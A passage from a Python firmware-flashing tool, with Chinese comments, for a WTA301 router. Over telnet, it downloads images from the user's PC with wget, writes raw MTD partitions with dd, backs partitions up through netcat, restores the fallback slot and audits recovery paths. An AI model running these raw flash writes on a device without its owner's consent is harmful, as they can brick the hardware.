        size, name = mtd_table[mtd]

        # 目标分区内可用长度 = 分区大小 - 目标内偏移
        avail = size - t["dst_seek"] * DD_BS
        if avail <= 0:
            problems.append("%s: mtd%d(%s) seek 越界" % (part, mtd, name))
            continue

        want = min(src_len, t["max_len"], avail)
        blocks = want // DD_BS
        if blocks == 0:
            problems.append("%s: 可用空间不足一个块" % part)
            continue

        need = src_len
        if blocks * DD_BS < need:
            # 内核可能被截断；只有 FIT 自身放得下才允许
            info("   ! %s 落点只有 0x%x，包内是 0x%x → 写 0x%x"
                 % (part, avail, src_len, blocks * DD_BS))

        plan["parts"][part] = {
            "mtd": mtd, "name": name, "why": t["why"],
            "src_skip": src_off // DD_BS, "dst_seek": t["dst_seek"],
            "count": blocks, "bytes": blocks * DD_BS,
            "md5": md5_of_pkg_slice(data, src_off, blocks * DD_BS),
        }

        # 安全检查：写入区间不得与任何一方的 overlay 重叠
        # （内核走 mtd13 容器，offset 0 不代表 flash 绝对地址，需要换算）
        abs_start = FLASH_ABS.get((fw, part), (mtd, t["dst_seek"]))
        if isinstance(abs_start, tuple):
            base_mtd, seek = abs_start
            base = MTD_ABS.get(base_mtd)
            if base is not None:
                a0 = base + seek * DD_BS
                a1 = a0 + blocks * DD_BS
                for ofw, o in OVERLAYS.items():
                    if overlaps(a0, a1, o["start"], o["start"] + o["len"]):
                        problems.append(
                            "%s 写入 [0x%07x,0x%07x) 撞上 %s 的 overlay [0x%07x,0x%07x)"
                            % (part, a0, a1, ofw, o["start"], o["start"] + o["len"]))

    # 内核完整性硬校验：FIT totalsize 必须落在实际写入的字节内
    if "kernel" in plan["parts"]:
        import struct
        fit_tot = struct.unpack(">I", data[PKG_KERNEL_OFF + 4:PKG_KERNEL_OFF + 8])[0]
        written = plan["parts"]["kernel"]["bytes"]
        info("   FIT totalsize 0x%x，实写 0x%x → %s"
             % (fit_tot, written, "OK" if fit_tot <= written else "截断 !!"))
        if fit_tot > written:
            problems.append("FIT 0x%x 超过实写 0x%x，会被截断，拒绝执行"
                            % (fit_tot, written))

    return plan, problems


def print_plan(plan):
    info("")
    info("[5] 刷写计划")
    for part in ("kernel", "rootfs"):
        if part not in plan["parts"]:
            continue
        p = plan["parts"][part]
        info("   %-6s → mtd%-2d (%-13s) src_skip=%-3d dst_seek=%-3d count=%-3d (0x%07x)"
             % (part, p["mtd"], p["name"], p["src_skip"], p["dst_seek"],
                p["count"], p["bytes"]))
        info("           md5=%s" % p["md5"])
        info("           理由: %s" % p["why"])
    info("   整包 md5 = %s" % plan["pkg_md5"])
    info("")
    info("   overlay 归属（本脚本不碰，两固件各自保留设置）:")
    for fw2, o in OVERLAYS.items():
        info("     %-8s %-16s 0x%07x..0x%07x (%.0f MiB)  %s"
             % (fw2, o["name"], o["start"], o["start"] + o["len"],
                o["len"] / 1048576.0, o["ubi_volume"]))


def do_flash(tn, plan, pc_ip, pkg_name):
    url = "http://%s:%d/%s" % (pc_ip, SRV_PORT, pkg_name)

    info("")
    info("[6] 设备侧下载镜像")
    out = tn.sh("cd /tmp && wget -O pkg.bin '%s' 2>&1 | tail -3" % url, 15.0)
    info("   " + out.strip().replace("\n", "\n   ")[:300])
    got = _first_md5(tn.sh("md5sum /tmp/pkg.bin", 10.0))
    info("   设备侧整包 md5 = %s" % (got or "(读取失败)"))
    if got != plan["pkg_md5"]:
        die("整包 md5 不一致，中止（尚未写入任何分区）\n"
            "    期望 %s\n    实得 %s" % (plan["pkg_md5"], got))

    # 写入顺序：非活动分区先，活动 rootfs 必须最后（见 LIVE_ROOT_MTD 注释）。
    # 颠倒就会在写 mtd6 的过程中被内核缺页读到半写状态。
    order = [p for p in ("kernel", "rootfs") if p in plan["parts"]]
    order.sort(key=lambda k: plan["parts"][k]["mtd"] == LIVE_ROOT_MTD)

    for part in order:
        p = plan["parts"][part]
        live = (p["mtd"] == LIVE_ROOT_MTD)
        info("")
        info("[7] 写 %s → /dev/mtdblock%d (%s)%s"
             % (part, p["mtd"], p["name"], "   ← 正在使用的分区" if live else ""))
        guard_write(p["mtd"], "flash-op")
        cmd = ("dd if=/tmp/pkg.bin of=/dev/mtdblock%d bs=%d skip=%d seek=%d count=%d 2>&1"
               % (p["mtd"], DD_BS, p["src_skip"], p["dst_seek"], p["count"]))
        if live:
            # 写完立即重启，中间不插任何命令（包括回读）
            tn.sh(cmd + "; sync; sync; reboot", 8.0)
            info("   已写入。sync + reboot 已下发。")
            info("   不回读校验的理由：回读 12MiB 要 20~30 秒，这时间里内核一旦缺页，")
            info("   就会从写了一半的 squashfs 取页 → 当场崩。源包 md5 已在写前校验过。")
            return True, True
        out = tn.sh(cmd, 40.0)
        info("   " + out.strip().replace("\n", "\n   ")[:260])

        info("[7b] 回读校验 %s" % part)
        rcmd = ("dd if=/dev/mtdblock%d bs=%d skip=%d count=%d 2>/dev/null | md5sum"
                % (p["mtd"], DD_BS, p["dst_seek"], p["count"]))
        got = _first_md5(tn.sh(rcmd, 35.0))
        good = (got == p["md5"])
        info("   %-6s 期望 %s  实得 %s  %s"
             % (part, p["md5"], got or "(失败)", "OK" if good else "MISMATCH"))
        if not good:
            return False, False

    tn.sh("sync", 3.0)
    return True, False


# ---------------------------------------------------------------------------
# 刷回原厂（A 槽 ← B 槽，或 ← 本地文件）
# ---------------------------------------------------------------------------

def build_stock_plan(tn, mtd_table, mode, kpath=None, rpath=None, kset=None):
    """算出把原厂固件写入 A 槽的计划。返回 (plan, problems)。

    mode='files' : 从两个本地文件写（auto 解析成功后也走这里）
    mode='bslot' : 从 B 槽（mtd10/mtd11）拷到 A 槽。md5 必须与已知原厂值完全相等，
                   否则拒绝 —— 实测这台板子的 mtd11 已经被刷成了 OpenWrt rootfs
                   (md5 3df05b56…)，盲目拷就会把 OP 烤进 A 槽。
    """
    problems = []
    plan = {"src": mode, "parts": {}}

    for part in ("kernel", "rootfs"):
        dst_mtd = SLOT_A[part]
        if dst_mtd not in mtd_table:
            problems.append("%s: 目标 mtd%d 不存在" % (part, dst_mtd))
            continue
        dst_size, dst_name = mtd_table[dst_mtd]

        if mode == "bslot":
            src_mtd = SLOT_B[part]
            if src_mtd not in mtd_table:
                problems.append("%s: 源 mtd%d（B 槽）不存在" % (part, src_mtd))
                continue
            src_size, src_name = mtd_table[src_mtd]
            if src_size > dst_size:
                problems.append("%s: B 槽 mtd%d 有 0x%x，A 槽 mtd%d 只有 0x%x，装不下"
                                % (part, src_mtd, src_size, dst_mtd, dst_size))
                continue
            count = min(src_size, dst_size) // DD_BS
            info("")
            info("   探测 B 槽 mtd%d (%s)…" % (src_mtd, src_name))
            ver = _probe_stock_image(tn, part, src_mtd)
            info("     %s" % ver["msg"])
            if not ver["ok"]:
                problems.append("%s: mtd%d 不是可启动的原厂镜像（%s）"
                                % (part, src_mtd, ver["msg"]))
                continue
            prev = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=%d count=%d 2>/dev/null | md5sum"
                                    % (src_mtd, DD_BS, count), 40.0))
            info("     B 槽 md5 = %s" % (prev or "(读取失败)"))
            if prev != STOCK_KNOWN_MD5[part]:
                problems.append(
                    "%s: B 槽 mtd%d 的 md5 %s 不是已知原厂值 %s\n"
                    "        说明 B 槽已经被改过（实测这台板子的 mtd11 就被刷成了\n"
                    "        OpenWrt rootfs）。拒绝拷贝，以免把 OpenWrt 烤进 A 槽。\n"
                    "        改用 --flash-stock files 指定离线原厂镜像。"
                    % (part, src_mtd, prev or "?", STOCK_KNOWN_MD5[part]))
                continue
            plan["parts"][part] = {
                "dst_mtd": dst_mtd, "dst_name": dst_name, "dst_seek": 0,
                "src_mtd": src_mtd, "src_name": src_name, "src_skip": 0,
                "count": count, "bytes": count * DD_BS, "md5": prev,
                "why": "B 槽 mtd%d → A 槽 mtd%d（B 槽只读）" % (src_mtd, dst_mtd),
            }
        else:
            path = kpath if part == "kernel" else rpath
            if not path or not os.path.exists(path):
                problems.append("%s: 找不到文件 %s" % (part, path))
                continue
            size = os.path.getsize(path)
            if size > dst_size:
                problems.append("%s: 文件 0x%x 超过 mtd%d 分区 0x%x"
                                % (part, size, dst_mtd, dst_size))
                continue
            count = (size + DD_BS - 1) // DD_BS
            md5 = _md5_file(path)
            ok, msg = _check_magic(part, open(path, "rb").read(262144))
            info("")
            info("   %s: %s (0x%x)" % (part, os.path.basename(path), size))
            info("     %s" % msg)
            if not ok:
                problems.append("%s: %s" % (part, msg))
                continue
            want = kset["%s_md5" % part] if kset else None
            if want and md5 != want:
                info("     ! md5 %s 与已知原厂值 %s 不同 —— 仍允许，但你自己确认过这是原厂"
                     % (md5, want))
            plan["parts"][part] = {
                "dst_mtd": dst_mtd, "dst_name": dst_name, "dst_seek": 0,
                "src_file": os.path.basename(path), "src_path": path, "src_skip": 0,
                "count": count, "bytes": count * DD_BS, "md5": md5,
                "why": "本地文件 → A 槽 mtd%d" % dst_mtd,
            }

    return plan, problems


def _check_magic(part, head):
    """用头部字节判断这是不是那个东西。head 至少 4 字节。"""
    if len(head) < 4:
        return False, "文件太短"
    magic = head[:4]
    if part == "kernel":
        if magic != b"\xd0\x0d\xfe\xed":
            return False, "不是 FIT 镜像（头为 %s，应为 d00dfeed）" % magic.hex()
        m = re.search(rb"Linux-(\d+\.\d+\.\d+)", head)
        if not m:
            return False, "FIT 里找不到 Linux-x.y.z 版本串"
        return True, "FIT OK，内核 %s" % m.group(1).decode()
    else:
        if magic != b"hsqs":
            return False, "不是 squashfs（头为 %s，应为 hsqs）" % magic.hex()
        return True, "squashfs OK"


def _probe_stock_image(tn, part, mtd_idx):
    """直接从设备的分区里校验：是 FIT 内核（带 Linux-x.y.z）还是 squashfs。"""
    head = _first_hex4(tn, mtd_idx)
    if part == "kernel":
        if head != "d00dfeed":
            return {"ok": False, "msg": "头为 %s，应为 d00dfeed" % (head or "?")}
        # FIT magic 过了还要确认里面真是 Linux 内核（不是别的东西套个 FIT 头）。
        # busybox grep -o 对某些 BRE 写法支持不稳，退化成多档尝试（实测踩过
        # `[0-9][0-9.]*` 返回空）。
        base = "dd if=/dev/mtdblock%d bs=65536 count=4 2>/dev/null" % mtd_idx
        for pat, label in (("Linux-[0-9][0-9.]*", "ver"),
                           ("Linux-[0-9.]*", "ver"),
                           ("Linux-", "loose")):
            out = tn.sh("%s | grep -a -o '%s' | head -1" % (base, pat), 10.0)
            got = _last_line(out)
            if got.startswith("Linux-") and len(got) > len("Linux-"):
                return {"ok": True, "msg": "FIT OK，%s" % got}
            if got == "Linux-" and label == "loose":
                return {"ok": True, "msg": "FIT OK，含 Linux 内核（版本串未解析出）"}
        return {"ok": False, "msg": "FIT 头 OK 但找不到 Linux 内核版本串"}
    else:
        if head != "68737173":
            return {"ok": False, "msg": "头为 %s，应为 hsqs" % (head or "?")}
        return {"ok": True, "msg": "squashfs OK"}


def _first_hex4(tn, mtd_idx):
    """读出分区头 4 字节，返回小写 hex 字符串（如 d00dfeed）。"""
    # 用 hexdump -C 而不是 -e：busybox 的 -e 格式语法与 util-linux 不完全一致，
    # 实测 `-e '1/1 "%02x"'` 在板上返回空（踩过）。-C 已验证可用。
    out = tn.sh("dd if=/dev/mtdblock%d bs=4 count=1 2>/dev/null | hexdump -C | head -1"
                % mtd_idx, 6.0)
    for line in out.splitlines():
        s = line.strip()
        # 形如： 00000000  d0 0d fe ed  ...
        if len(s) > 10 and s[:8] == "00000000" and s[8:10].isspace():
            hexpart = s.split(None, 1)[1][:11].split()
            if len(hexpart) >= 4 and all(len(x) == 2 for x in hexpart[:4]):
                return "".join(hexpart[:4]).lower()
    return ""


# ---------------------------------------------------------------------------
# 备份：设备 `dd | nc` 把整片推回 PC
# ---------------------------------------------------------------------------

class NcSink:
    """监听一个 TCP 端口，收设备推过来的字节流写入文件。

    busybox 有 nc（板上实测 HAVE:nc），所以不需要 base64 / hexdump 绕路。
    一次只收一个连接。
    """

    def __init__(self, port=NC_BACKUP_PORT, bind="0.0.0.0"):
        self.port = port
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((bind, port))
        self.sock.listen(1)
        self.sock.settimeout(120)

    def recv_to(self, path, timeout=180):
        """接一个连接写到 path，返回实收字节数（-1 = 超时没人连）。"""
        n = 0
        self.sock.settimeout(timeout)
        try:
            conn, _ = self.sock.accept()
        except socket.timeout:
            return -1
        conn.settimeout(60)
        try:
            with open(path, "wb") as f:
                while True:
                    try:
                        b = conn.recv(1 << 16)
                    except socket.timeout:
                        break
                    if not b:
                        break
                    f.write(b)
                    n += len(b)
        finally:
            conn.close()
        return n

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


# 备份时跳过 mtd15/mtd16 —— 它们是 mtd3/mtd7 里的 UBI 卷视图，不是独立区域，
# 抓下来只会重复数据，而且 erasesize 不一致还会误导判定。
BACKUP_SKIP = {15, 16}


def do_backup(tn, mtd_table, pc_ip, outdir):
    os.makedirs(outdir, exist_ok=True)
    sink = NcSink()
    info("")
    info("[B1] 备份到 %s" % os.path.abspath(outdir))
    info("     PC 侧监听 TCP %d，设备侧 `dd if=/dev/mtdblockN | nc <PC> %d`"
         % (NC_BACKUP_PORT, NC_BACKUP_PORT))

    manifest = []
    ok = True
    for idx in sorted(mtd_table):
        if idx in BACKUP_SKIP:
            continue
        size, name = mtd_table[idx]
        base = "mtd%d_%s.bin" % (idx, re.sub(r"[^A-Za-z0-9_.-]", "_", name))
        path = os.path.join(outdir, base)
        info("")
        info("   mtd%-2d %-18s 0x%08x ..." % (idx, name, size))

        # 单线程：发命令 -> 从 nc 收数据 -> 排空 telnet。
        # 绝不能把 tn.sh 丢进线程，会和主线程抢同一个套接字。
        tn.send("dd if=/dev/mtdblock%d bs=65536 2>/dev/null | md5sum" % idx)
        want = _first_md5(tn.drain(max(4.0, size / 4194304.0), hard_timeout=4.0))

        tn.send("dd if=/dev/mtdblock%d bs=65536 2>/dev/null | nc %s %d"
                % (idx, pc_ip, NC_BACKUP_PORT))
        got = sink.recv_to(path, timeout=max(60.0, size / 1048576.0) * 3)
        tn.drain(0.3)

        local = _md5_file(path) if os.path.exists(path) else ""
        if got != size:
            # 已知现象：mtd11/mtd13 这类「内容之后全是擦除态」的分区，
            # 内核读到实际数据结尾就返回 EOF（板上 wc -c 实测同样长度）。
            # 所以短读不一定是错误，但要显式标出来，不能当完整备份用。
            info("     PARTIAL 实收 0x%x / 分区 0x%x（设备返回 EOF）"
                 % (max(got, 0), size))
            info("       尾部 0x%x 字节读不到（多为擦除态 0xFF）"
                 % (size - max(got, 0)))
            if want and local and got > 0:
                dev_head = _first_md5(tn.sh(
                    "dd if=/dev/mtdblock%d bs=65536 count=%d 2>/dev/null | md5sum"
                    % (idx, got // 65536), max(20.0, got / 2097152.0)))
                if dev_head == local:
                    info("       前 0x%x 字节 md5 与设备一致 -> 缺的只是尾部" % got)
                    manifest.append((idx, name, got, local, base + " (PARTIAL)"))
                    continue
            ok = False
            continue
        if local != want:
            info("     !! md5 不符  设备 %s  本地 %s" % (want or "?", local))
            ok = False
            continue
        info("     OK 0x%x  md5=%s" % (got, local))
        manifest.append((idx, name, size, local, base))

    sink.close()

    mf = os.path.join(outdir, "MD5SUMS.txt")
    with open(mf, "w", encoding="utf-8") as f:
        f.write("# WTA301 分区备份清单\n")
        f.write("# 每行: md5  大小  分区号  分区名  文件名\n")
        for idx, name, size, md5, base in manifest:
            f.write("%s  %10d  mtd%-2d  %-18s  %s\n" % (md5, size, idx, name, base))
    info("")
    info("[B2] 清单: %s（%d 个分区）" % (mf, len(manifest)))
    if not ok:
        info("   !! 有分区未备份成功（上面标 !! 的）")
    return ok


# ---------------------------------------------------------------------------
# 修 B 槽（把离线原厂镜像写回去）
# ---------------------------------------------------------------------------

def restore_bslot(tn, args, mtd_table, pc_ip, kset, kpath, rpath):
    """把原厂 kernel/rootfs 写到 B 槽（mtd10/mtd11）。

    为什么这个操作比写 A 槽安全得多：我们正从 A 槽（mtd5/mtd6）跑，
    mtd10/mtd11 不是活动分区 -> 写完可以放心回读校验，没有半写窗口。

    写回后 B 槽头（0x800000 的 +0xa0/+0xb0）记录的 md5 又与内容对上，
    一级 u-boot 的 `Dual image validation` 就能重新通过。
    """
    info("")
    info("[R1] 修 B 槽：mtd5 (kernel 0x880000) + mtd6 (rootfs 0xFC0000)")
    info("     写回后 B 槽头（0x800000 的 +0xa0/+0xb0）md5 又能对上，")
    info("     一级 u-boot 的双槽校验就会重新通过。")

    # 跑在原厂固件时 B 槽 rootfs(mtd6) 就是活动分区，写它要特殊处理。
    # 这里换成按物理偏移判断，不靠分区名/编号。
    live_abs = live_root_abs(tn)

    parts = []
    # B 槽 = mtd5 (0x880000) / mtd6 (0xFC0000)
    for part, mtd_idx, path, want in (
            ("kernel", 5, kpath, kset["kernel_md5"] if kset else None),
            ("rootfs", 6, rpath, kset["rootfs_md5"] if kset else None)):
        if mtd_idx not in mtd_table:
            info("   !! mtd%d 不存在" % mtd_idx)
            return 4
        if not path or not os.path.exists(path):
            info("   !! 找不到 %s 的源文件" % part)
            return 4
        size, name = mtd_table[mtd_idx]
        fsz = os.path.getsize(path)
        if fsz != size:
            info("   !! %s 有 0x%x，但 mtd%d 分区是 0x%x" % (part, fsz, mtd_idx, size))
            return 4
        md5 = _md5_file(path)
        if want and md5 != want:
            info("   !! %s md5 %s 与 B 槽头期望的 %s 不同" % (part, md5, want))
            info("      写进去槽头依然对不上，一级 u-boot 不会认这个槽。")
            return 4
        info("   %-6s %-22s 0x%x  md5=%s  -> mtd%d"
             % (part, os.path.basename(path), fsz, md5, mtd_idx))
        parts.append((part, mtd_idx, name, path, size, md5))

    if args.dry_run:
        info("")
        info("   --dry-run：未写入任何东西")
        return 0
    if not _confirm(args, "确认把原厂镜像写回 B 槽？"):
        return 0

    for part, mtd_idx, name, path, size, md5 in parts:
        url = "http://%s:%d/%s" % (pc_ip, SRV_PORT, os.path.basename(path))
        info("")
        info("[R2] 写 %s -> mtd%d (%s)" % (part, mtd_idx, name))
        out = tn.sh("cd /tmp && wget -O r.bin '%s' 2>&1 | tail -1" % url, 40.0)
        info("   下载: %s" % _last_line(out)[:110])
        got = _first_md5(tn.sh("md5sum /tmp/r.bin", 20.0))
        if got != md5:
            info("   !! 下载后 md5 %s != %s，中止" % (got or "?", md5))
            return 5
        info("   设备侧 md5 = %s" % got)

        guard_write(mtd_idx, "restore-bslot")
        if live_abs is not None and MTD_OFFSET.get(mtd_idx) == live_abs:
            # B 槽 rootfs 正是当前活动的（跑原厂时就是）。写完必须立刻重启，
            # 中间不能再读任何东西，否则内核缺页会读到半写状态。
            tn.sh("dd if=/tmp/r.bin of=/dev/mtdblock%d bs=%d 2>&1; sync; sync; reboot"
                  % (mtd_idx, DD_BS), 10.0)
            info("   活动分区已写入 -> sync -> reboot 已下发（同一条命令）")
            info("   不回读（回读窗口里缺页会崩）；源 md5 写前已验过。")
            return 0

        out = tn.sh("dd if=/tmp/r.bin of=/dev/mtdblock%d bs=%d 2>&1"
                    % (mtd_idx, DD_BS), max(30.0, size / 2097152.0) * 2)
        info("   写入: %s" % _last_line(out)[:150])
        tn.sh("rm -f /tmp/r.bin", 3.0)

        info("[R3] 回读校验 %s" % part)
        back = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=65536 2>/dev/null | md5sum"
                               % mtd_idx, max(25.0, size / 2097152.0)))
        if back != md5:
            info("   !! 回读 %s != %s" % (back or "?", md5))
            return 5
        info("   OK %s" % back)

    info("")
    info("[R4] B 槽已恢复")
    info("   这两个分区不是活动分区，所以【不需要重启】，也不影响当前系统。")
    info("   下次重启一级 u-boot 会重新验 B 槽并通过 -> 回退出口恢复。")
    return 0


# ---------------------------------------------------------------------------
# 安全审计（只读，什么都不写）
# ---------------------------------------------------------------------------

def do_verify(tn, mtd_table):
    """把全部逃生出口列出来：现在到底有几条命。"""
    info("")
    info("[V] 安全审计（只读，不写任何东西）")
    exits = 0

    def head4(idx):
        out = tn.sh("dd if=/dev/mtdblock%d bs=4 count=1 2>/dev/null | hexdump -C | head -1"
                    % idx, 6.0)
        for line in out.splitlines():
            s = line.strip()
            if s.startswith("00000000"):
                return "".join(s.split()[1:5]).lower()
        return ""

    info("")
    if 14 in mtd_table:
        flag = head4(14)
        info("   boot_flag (mtd14) 头 = %s" % (flag or "读不到"))
        if flag == "55aa4246":
            info("     -> magic OK，一级 u-boot 能选槽")
            exits += 1
        else:
            info("     !! magic 不是 55aa4246")
    else:
        info("   !! mtd14 boot_flag 不存在")

    info("")
    ub_ok = 0
    for idx, label in ((4, "normal_boot"), (9, "normal_boot_bak")):
        if idx not in mtd_table:
            info("   mtd%-2d %-16s 不存在" % (idx, label))
            continue
        md5 = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=65536 2>/dev/null | md5sum" % idx, 15.0))
        if md5 == KIT_UBOOT_MD5:
            tag = "= 我们的 kit"
            ub_ok += 1
        elif md5 and md5 != "0" * 32:
            tag = "(非 kit，可能是原厂二级 u-boot)"
            ub_ok += 1
        else:
            tag = "!! 空/读不到"
        info("   mtd%-2d %-16s md5=%s %s" % (idx, label, md5 or "?", tag))
    if ub_ok > 0:
        exits += 1

    info("")
    pairs = stock_md5_pairs()
    for label, ki, ri in (("A 槽", 10, 11), ("B 槽", 5, 6)):
        if ki not in mtd_table or ri not in mtd_table:
            continue
        kmd5 = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=65536 2>/dev/null | md5sum" % ki,
                               max(20.0, mtd_table[ki][0] / 2097152.0)))
        rmd5 = _first_md5(tn.sh("dd if=/dev/mtdblock%d bs=65536 2>/dev/null | md5sum" % ri,
                               max(30.0, mtd_table[ri][0] / 2097152.0)))
        kind_k = "FIT" if head4(ki) == "d00dfeed" else "?"
        kind_r = "squashfs" if head4(ri) == "68737173" else "?"
        info("   %s  mtd%-2d/%-2d  kernel %-9s %s   rootfs %-9s %s"
             % (label, ki, ri, kind_k, (kmd5 or "?")[:12], kind_r, (rmd5 or "?")[:12]))
        if kind_k != "FIT" or kind_r != "squashfs":
            info("         -> 头部不对，不可启动")
            continue
        exits += 1
        ver = pairs.get((kmd5, rmd5))
        if ver:
            info("         -> 可启动，原厂内容：%s" % ver)
        else:
            # 内核 md5 能对上某个原厂版本就算可识别的内核
            kver = next((n for (k, r), n in pairs.items() if k == kmd5), None)
            if kver:
                info("         -> 可启动，内核是原厂（%s）" % kver)
                info("            !! rootfs 不是任何已知原厂版本（%s）" % (rmd5 or "?")[:12])
                info("               这个槽的原厂回退能力已经不完整。")
            else:
                info("         -> 可启动，但内容非原厂（可能是 OpenWrt 或其它）")

    info("")
    info("   离线原厂镜像（PC 侧）:")
    kset, kp, rp = find_stock_set()
    if kset:
        info("     可用：%s" % kset["name"])
        exits += 1
    else:
        info("     !! 没找到（--flash-stock auto 会失败）")

    info("")
    info("   == 结论 ==")
    if exits >= 3:
        info("   逃生出口 %d 条，够用。mtd0/mtd1/mtd2/mtd14 都未动，TTL 可救。" % exits)
    else:
        info("   !! 只有 %d 条出口，建议先用 --flash-stock 把 A 槽写回原厂。" % exits)
    info("   注：槽头（0x800000 / 0x4800000）不在任何 mtd 分区内，Linux 读不到，")
    info("       只能上 u-boot 时用 tplcheck 看。本条审计覆盖不到，靠离线备份。")
    return 0


def _last_line(text):
    """取输出最后一行有效内容 —— 必须跳过命令回显与 shell 提示符。

    踩过：返回了 `(unreachable)/ #`，拿它去 startswith("Linux-") 永远失败。
    """
    for line in reversed(text.splitlines()):
        s = line.strip()
        if not s:
            continue
        if s.startswith("dd if=") or s.startswith("grep ") or s.startswith("|"):
            continue
        if s.endswith("#") and ("/ #" in s or s.startswith("(")):
            continue
        if s.startswith("BusyBox") or s == "ok":
            continue
        return s
    return ""


def print_stock_plan(plan):
    info("")
    info("[S2] 刷回原厂计划（写入 A 槽，B 槽只读）")
    for part in ("kernel", "rootfs"):
        if part not in plan["parts"]:
            continue
        p = plan["parts"][part]
        src = ("mtd%d %s" % (p["src_mtd"], p["src_name"]) if "src_mtd" in p
               else p["src_file"])
        info("   %-6s %-24s → mtd%-2d (%-10s) count=%-3d (0x%07x)"
             % (part, src, p["dst_mtd"], p["dst_name"], p["count"], p["bytes"]))
        info("          md5=%s" % p["md5"])
    info("")
    info("   A 槽 = 0x04880000 kernel / 0x04FC0000 rootfs")
    info("   B 槽 = 0x00880000 kernel / 0x00FC0000 rootfs   ← 不动")
    info("   mtd0 (factory_boot) / mtd4 / mtd9 / mtd14 (boot_flag) 全部不碰")
    live = [p for p in plan["parts"].values() if p["dst_mtd"] == LIVE_ROOT_MTD]
    if live:
        info("")
        info("   !! 目标里有活动 rootfs（mtd%d）。它是 squashfs 只读挂载，" % LIVE_ROOT_MTD)
        info("      缺页时才去 flash 取，写到一半被读到就当场崩。")
        info("      脚本把它放最后，写完在同一条命令里 sync+reboot，中间不读任何东西。")
        info("      代价：放弃 rootfs 回读校验（源镜像 md5 已在写前验过）。")
        info("      所以【重启前会看起来卡住几秒】—— 那是正常的。")
    else:
        info("")
        info("   目标都不是活动分区，写完可以做完整回读校验，不需要立刻重启。")


def do_flash_stock(tn, plan, pc_ip, mode):
    # 先非活动分区（kernel），后活动分区（rootfs）
    order = [p for p in ("kernel", "rootfs") if p in plan["parts"]]
    order.sort(key=lambda k: plan["parts"][k]["dst_mtd"] == LIVE_ROOT_MTD)

    ok_all = True
    for part in order:
        p = plan["parts"][part]
        live = (p["dst_mtd"] == LIVE_ROOT_MTD)
        info("")
        info("[S3] 写 %s → /dev/mtdblock%d (%s)%s"
             % (part, p["dst_mtd"], p["dst_name"], "   ← 正在使用的分区" if live else ""))

        if "src_mtd" in p:
            src = "/dev/mtdblock%d" % p["src_mtd"]
        else:
            src = "/tmp/stock_%s.img" % part
            url = "http://%s:%d/%s" % (pc_ip, SRV_PORT, p["src_file"])
            out = tn.sh("cd /tmp && wget -O stock_%s.img '%s' 2>&1 | tail -2"
                        % (part, url), 40.0)
            last = _last_line(out)
            info("   下载 %s %s" % (p["src_file"], last[:110]))
            if not tn.sh("test -s %s && echo YES" % src, 5.0).count("YES"):
                info("   !! 设备侧文件没下载成功，中止（尚未写入）")
                return False, False
            got = _first_md5(tn.sh("md5sum %s" % src, 15.0))
            info("   设备侧 %s md5 = %s" % (part, got or "(失败)"))
            if got != p["md5"]:
                info("   !! md5 不一致，中止（尚未写入任何分区）")
                info("      期望 %s" % p["md5"])
                info("      实得 %s" % (got or "?"))
                return False, False

        guard_write(p["dst_mtd"], "flash-stock")
        cmd = ("dd if=%s of=/dev/mtdblock%d bs=%d skip=%d seek=%d count=%d"
               % (src, p["dst_mtd"], DD_BS, p["src_skip"], p["dst_seek"], p["count"]))
        if live:
            tn.sh(cmd + " 2>&1; sync; sync; reboot", 10.0)
            info("   已写入 → sync → reboot 已下发（同一条命令，中间无间隙）")
            info("   不回读：回读要 20~30 秒，这时间里缺页读到半写的 squashfs 会当场崩")
            return ok_all, True

        out = tn.sh(cmd + " 2>&1", 30.0)
        info("   " + _last_line(out)[:200])

        info("[S3b] 回读校验 %s" % part)
        rcmd = ("dd if=/dev/mtdblock%d bs=%d skip=%d count=%d 2>/dev/null | md5sum"
                % (p["dst_mtd"], DD_BS, p["dst_seek"], p["count"]))
        got = _first_md5(tn.sh(rcmd, 30.0))
        good = (got == p["md5"])
        info("   %-6s 期望 %s  实得 %s  %s"
             % (part, p["md5"], got or "(失败)", "OK" if good else "MISMATCH"))
        if not good:
            info("   !! A 槽 %s 写坏了。B 槽未受影响，但 kit 会先试 A 槽…" % part)
            info("      此时【不要重启】，重新跑一次即可重写。")
            return False, False
        ok_all = True

    return ok_all, False


def _first_md5(text):
    for line in text.splitlines():
        tok = line.strip().split()
        if tok and len(tok[0]) == 32 and all(c in "0123456789abcdefABCDEF" for c in tok[0]):
            return tok[0].lower()
    return ""


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main():
    _utf8_stdout()

    argv = sys.argv[1:]
    interactive = not argv or argv[0] in ("-i", "--interactive", "menu")
    if not interactive:
        return run_cli(argv)

    # ---------------- 傻瓜式菜单 ----------------
    info("=" * 68)
    info("   WTA301 刷机工具")
    info("=" * 68)
    info("")
    info("   开始前确认：")
    info("     1. 板子已上电，用网线接它的 LAN 口（不是 WAN）")
    info("     2. 板子在【原厂固件】状态（第一次刷机需要）")
    info("     3. 本程序要用管理员权限跑")
    info("")
    info("   全程只动 A 槽，B 槽保留原厂做回退。")
    info("")
    info("   请选择：")
    info("")
    info("     [1] 只获取 root（不刷任何东西）")
    info("     [2] 刷 OpenWrt（完整包）")
    info("     [3] 只刷 u-boot kit（保留当前固件）")
    info("     [4] 刷回原厂固件")
    info("     [5] 安全审计（列出生路，不写任何东西）")
    info("     [6] 整片备份到本机")
    info("     [7] 修 B 槽（把原厂镜像写回回退槽）")
    info("     [8] 查看分区表与风险说明")
    info("     [0] 退出")
    info("")

    try:
        choice = input("   输入序号: ").strip()
    except (EOFError, KeyboardInterrupt):
        info("")
        return 0

    if choice == "0" or choice == "":
        return 0
    if choice == "5":
        return run_cli(["--verify", "--interactive-ok"])

    if choice == "6":
        info("")
        info("   把设备所有分区整片拷到本机的 backup 目录（约 126 MB）。")
        info("   用 nc 直连，pc 侧监听 8098，会逐区比 md5。")
        info("")
        try:
            d = input("   目标目录（直接回车用默认 backup）: ").strip().strip('"')
        except (EOFError, KeyboardInterrupt):
            info("")
            return 0
        return run_cli(["--backup", d or "backup", "--interactive-ok"])

    if choice == "7":
        info("")
        info("   B 槽是回退出口。如果你之前把它刷坏过，这里可以写回原厂。")
        info("   写的时候我们跑在 A 槽，B 槽不是活动分区 -> 比写 A 槽安全。")
        info("")
        try:
            ok = input("   继续？[y/N] ").strip().lower()
